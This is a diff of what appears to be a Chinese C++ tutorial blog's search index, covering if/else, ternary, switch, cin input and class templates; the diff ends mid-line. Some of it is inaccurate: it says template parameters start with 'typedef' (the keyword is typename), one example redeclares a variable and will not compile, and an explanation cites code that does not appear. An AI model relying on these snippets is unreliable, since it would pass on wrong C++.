-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)<span class="comment">//注意此处没有;</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="类模板的定义与声明"><a href="#类模板的定义与声明" class="headerlink" title="类模板的定义与声明"></a>类模板的定义与声明</h1><p>类模板的定义形式：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;类型形式及参数&gt; <span class="class"><span class="keyword">class</span> 类模板名&#123;</span></span><br><span class="line">		<span class="comment">//类模板体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="2-多行格式if语句"><a href="#2-多行格式if语句" class="headerlink" title="2.多行格式if语句"></a>2.多行格式if语句</h2><p>语法：<code>if(条件)&#123;条件满足时执行的语句&#125;else&#123;条件不满足是执行的语句&#125;;</code></p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也可以声明类模板分成template部分和类部分：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;类型形式及参数&gt; </span><br><span class="line"><span class="class"><span class="keyword">class</span> 类模板名&#123;</span></span><br><span class="line">		<span class="comment">//类模板体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="3-多条件的if语句"><a href="#3-多条件的if语句" class="headerlink" title="3.多条件的if语句"></a>3.多条件的if语句</h2><p>语法：<code>if(条件1)&#123;条件1满足时执行的代码&#125;else if(条件2)&#123;条件2满足时执行的代码&#125; ... else&#123;以上条件都不满足执行的语句&#125;</code></p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)<span class="comment">//第一个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">400</span>)<span class="comment">//第二个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得还行&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">300</span>)<span class="comment">//第三个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得有点差&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>template为关键字，表示定义一个模板。<br> &lt;&gt;表示模板参数，<strong>模板参数有两种，是模板类型参数、模板非类型参数。模板类型参数使用关键字class或typedef开始，后面跟一个合法类型名。模板非类型参数与普通参数定义相同，通常是一个常数</strong>。可以不使用模板非类型参数。</p>
+<h1 id="模板类型参数的综合应用"><a href="#模板类型参数的综合应用" class="headerlink" title="模板类型参数的综合应用"></a>模板类型参数的综合应用</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">通过&lt;&gt;把int、double两种数据类型分别传送到类</span></span><br><span class="line"><span class="comment">模板type1、type2进行类的创建、构造函数、show函数的运算输出。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">type1</span>,<span class="keyword">class</span> <span class="title">type2</span>&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		type1 x;</span><br><span class="line">		type2 y;</span><br><span class="line">		<span class="built_in">test</span>(type1 a,type2 b)</span><br><span class="line">		&#123;</span><br><span class="line">			x=a;</span><br><span class="line">			y=b;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			cout&lt;&lt;x&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;y;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	<span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line">	test&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;<span class="built_in">name</span>(a,b); <span class="comment">//类模板的调用</span></span><br><span class="line">	name.<span class="built_in">show</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-嵌套if语句"><a href="#4-嵌套if语句" class="headerlink" title="4.嵌套if语句"></a>4.嵌套if语句</h2><p>if语句里面还有if语句</p>
-<p>注意if嵌套语句中条件的大小顺序</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;<span class="comment">//此处判断条件要从大到小，否则无法正常运行</span></span><br><span class="line">        <span class="keyword">if</span>(score&gt;<span class="number">650</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望985&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">600</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望211&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望一本&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>稍作解释：</p>
+<p>1、首先是声明一个类模板 template &lt; class type &gt;，type表示参数的数据类型。<br>2、然后是定义类模板的具体实现方法<br>3、最后是类模板的调用C&lt; int &gt;p(a);将&lt;&gt;里的数据类型int传送到类模板中，int将代替类模板中的type进行构造函数及类中一系列自定义函数的运行，最终<code>p.show();</code>输出结果。 </p>
+<p>只需要把类的对象的数据类型传送到模板中，模板将自动生成符合要求的类。 这样我们就避免了因为数据类型各种各样，而频繁创建类的问题。<br>所以，定义类模板的优点就是适应各种类型对象的计算及输入输出。 </p>
+<h1 id="默认模板类型参数的应用"><a href="#默认模板类型参数的应用" class="headerlink" title="默认模板类型参数的应用"></a>默认模板类型参数的应用</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">type1</span>,<span class="keyword">class</span> <span class="title">type2</span>=</span><span class="keyword">int</span>&gt;<span class="comment">//区别点</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		type1 x;</span><br><span class="line">		type2 y;</span><br><span class="line">		<span class="built_in">test</span>(type1 a,type2 b)</span><br><span class="line">        &#123;</span><br><span class="line">			x=a,y=b;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">			cout&lt;&lt;x&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">2020</span>;</span><br><span class="line">	<span class="keyword">double</span> b=<span class="number">1111.22</span>;</span><br><span class="line">	test&lt;<span class="keyword">int</span>,<span class="keyword">double</span>&gt;<span class="built_in">name1</span>(a,b);<span class="comment">//区别点</span></span><br><span class="line">	name1.<span class="built_in">show</span>();</span><br><span class="line">	test&lt;<span class="keyword">int</span>&gt;<span class="built_in">name2</span>(a,b);<span class="comment">//区别点</span></span><br><span class="line">	name2.<span class="built_in">show</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h1 id="二、三目运算符"><a href="#二、三目运算符" class="headerlink" title="二、三目运算符"></a>二、三目运算符</h1><p>作用：通过三目运算符实现简单的判断</p>
-<p>语法：<code>条件 ? 代码1 : 代码2</code></p>
-<p>解释：</p>
-<p>如果满足条件，则执行代码1，否则执行代码2</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,c;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b;<span class="comment">//注意此处为&gt;&gt;而不是,</span></span><br><span class="line">    </span><br><span class="line">    c=(a&gt;b?a:b);</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    (a&gt;b?a:b)=<span class="number">50</span>;<span class="comment">//三目运算符同样可以这样使用，表示将a b中较大的一个赋值为50</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>与上题不同之处在于，在定义类模板时<code>template &lt;class type1,class type2=int&gt;</code>给type增加了一个默认数据类型int，所以在调用类模板创建类对象<code>test&lt; int &gt;name2(a,b);</code>时，name2只规定了type1的数据类型，那么type2将采取默认值int，输出类型也将为int。</p>
+<h1 id="模板非类型参数的入门应用"><a href="#模板非类型参数的入门应用" class="headerlink" title="模板非类型参数的入门应用"></a>模板非类型参数的入门应用</h1><p>将模板非类型参数应用到int、double类型的输出</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">type1</span>,<span class="keyword">class</span> <span class="title">type2</span>,<span class="title">int</span> <span class="title">n</span>=</span><span class="number">1</span>&gt;<span class="comment">//区别点</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		type1 x;</span><br><span class="line">		type2 y;</span><br><span class="line">		<span class="built_in">test</span>(type1 a,type2 b)</span><br><span class="line">		&#123;</span><br><span class="line">			x=a,y=b;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			cout&lt;&lt;x+n&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;y+n&lt;&lt;endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">2020</span>;</span><br><span class="line">	<span class="keyword">double</span> b=<span class="number">1111.22</span>;</span><br><span class="line">	test&lt;<span class="keyword">int</span>,<span class="keyword">double</span>&gt;<span class="built_in">name</span>(a,b);<span class="comment">//区别点</span></span><br><span class="line">	name.<span class="built_in">show</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h1 id="三、switch条件语句"><a href="#三、switch条件语句" class="headerlink" title="三、switch条件语句"></a>三、switch条件语句</h1><p>作用：执行多条件分支语句</p>
-<p>语法：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">switch</span></span>(表达式)</span><br><span class="line">    </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> 结果<span class="number">1</span>:执行语句;<span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">case</span> 结果<span class="number">2</span>:执行语句;<span class="keyword">break</span>;  </span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:执行语句;<span class="keyword">break</span>;    </span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>例如：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;prefect&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;<span class="comment">//此处一定不要忘记break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;normal&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;bad&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>注意：</p>
-<p>switch缺点：判断时只能是整型或者字符型，不可以是区间，而if可以</p>
-<p>switch有点：结构清晰，执行效率高</p>
+<p>在定义类模板<code>template &lt;class type1,class type2,int n=1&gt;</code>时加入了模板非类型参数n参与运算。</p>
 ]]></content>
       <tags>
         <tag>C++</tag>
@@ -648,6 +701,52 @@
 <p>用法：<code>cin&gt;&gt; 变量</code></p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;你输入的数为&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> b = <span class="literal">false</span>;</span><br><span class="line">    cin&gt;&gt;b;<span class="comment">//除了0之外的数字都是真的，字母是假的。若数字后面有字母，则直接看数字，若字母后面有数字，则就是假</span></span><br><span class="line">    cout&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//也可这样用</span></span><br><span class="line">    <span class="keyword">int</span> b,c,d;</span><br><span class="line">    cin&gt;&gt;b&gt;&gt;c&gt;&gt;d;</span><br><span class="line">    cout&lt;&lt;b&lt;&lt;c&lt;&lt;d;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <tags>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C++中的选择选择语句</title>
+    <url>/2021/12/11/C-%E4%B8%AD%E7%9A%84%E9%80%89%E6%8B%A9%E8%AF%AD%E5%8F%A5/</url>
+    <content><![CDATA[<h1 id="一、if条件语句"><a href="#一、if条件语句" class="headerlink" title="一、if条件语句"></a>一、if条件语句</h1><p>作用：执行满足条件的语句</p>
+<p>if语句的三种形式</p>
+<ul>
+<li>单行格式if语句</li>
+<li>多行格式if语句</li>
+<li>多条件的if语句</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="1-单行格式if语句"><a href="#1-单行格式if语句" class="headerlink" title="1.单行格式if语句"></a>1.单行格式if语句</h2><p>语法：<code>if(条件)&#123;条件满足时执行的语句&#125;</code></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)<span class="comment">//注意此处没有;</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-多行格式if语句"><a href="#2-多行格式if语句" class="headerlink" title="2.多行格式if语句"></a>2.多行格式if语句</h2><p>语法：<code>if(条件)&#123;条件满足时执行的语句&#125;else&#123;条件不满足是执行的语句&#125;;</code></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-多条件的if语句"><a href="#3-多条件的if语句" class="headerlink" title="3.多条件的if语句"></a>3.多条件的if语句</h2><p>语法：<code>if(条件1)&#123;条件1满足时执行的代码&#125;else if(条件2)&#123;条件2满足时执行的代码&#125; ... else&#123;以上条件都不满足执行的语句&#125;</code></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)<span class="comment">//第一个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">400</span>)<span class="comment">//第二个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得还行&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">300</span>)<span class="comment">//第三个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得有点差&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-嵌套if语句"><a href="#4-嵌套if语句" class="headerlink" title="4.嵌套if语句"></a>4.嵌套if语句</h2><p>if语句里面还有if语句</p>
+<p>注意if嵌套语句中条件的大小顺序</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;<span class="comment">//此处判断条件要从大到小，否则无法正常运行</span></span><br><span class="line">        <span class="keyword">if</span>(score&gt;<span class="number">650</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望985&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">600</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望211&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望一本&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="二、三目运算符"><a href="#二、三目运算符" class="headerlink" title="二、三目运算符"></a>二、三目运算符</h1><p>作用：通过三目运算符实现简单的判断</p>
+<p>语法：<code>条件 ? 代码1 : 代码2</code></p>
+<p>解释：</p>
+<p>如果满足条件，则执行代码1，否则执行代码2</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,c;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b;<span class="comment">//注意此处为&gt;&gt;而不是,</span></span><br><span class="line">    </span><br><span class="line">    c=(a&gt;b?a:b);</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    (a&gt;b?a:b)=<span class="number">50</span>;<span class="comment">//三目运算符同样可以这样使用，表示将a b中较大的一个赋值为50</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;<span 